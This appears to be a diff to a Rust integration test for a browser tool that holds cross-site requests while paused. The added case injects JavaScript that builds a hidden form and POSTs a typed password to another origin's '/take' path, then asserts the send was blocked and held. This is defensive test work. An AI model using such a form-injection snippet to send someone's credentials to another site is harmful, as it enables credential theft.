@@ -1303,7 +1303,37 @@ async fn while_paused_a_login_to_the_person_s_own_site_goes_and_the_same_navigat
         "the person was moved by a request that was held: {}",
         page.url()
     );
+
+    // **The same password in the body rather than the query.** A POST carries a
+    // secret in its fields, which is where a login form puts it, and reading
+    // only the address let a paused navigation post the person's password to
+    // another site by putting it in the form instead of the query.
+    page.goto(&base, None).await.expect("back to the shop");
+    holds.typed_in(1, "hunter2-the-passphrase").await;
+    page.evaluate::<String, ()>(
+        r#"payload => {
+            const [other, secret] = JSON.parse(payload);
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = other + '/take';
+            form.innerHTML = '<input name="password" value="' + secret + '">';
+            document.body.appendChild(form);
+            form.requestSubmit();
+        }"#,
+        Some(&format!(r#"["{other}","hunter2-the-passphrase"]"#)),
+    )
+    .await
+    .ok();
+    tokio::time::sleep(Duration::from_millis(800)).await;
+    assert!(
+        !arrived.asked_for("/take"),
+        "the password went out in a form body while the browser was paused: {:?}",
+        arrived.requests()
+    );
+    assert_eq!(holds.waiting().await, 2, "and both cross-site sends are held as cards");
 }
+
+
 
 /// **One chat is never told what happened in another.**
 ///
